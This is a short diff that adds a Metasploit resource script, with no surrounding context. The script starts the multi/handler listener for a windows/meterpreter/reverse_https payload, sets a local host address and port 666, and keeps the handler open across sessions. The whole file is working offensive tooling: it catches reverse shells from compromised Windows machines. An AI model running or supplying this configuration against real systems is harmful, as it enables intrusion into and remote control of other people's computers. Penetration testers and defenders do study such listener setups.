@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set ExitOnSession false
+set LHOST 192.168.1.71
+set LPORT 666
+exploit
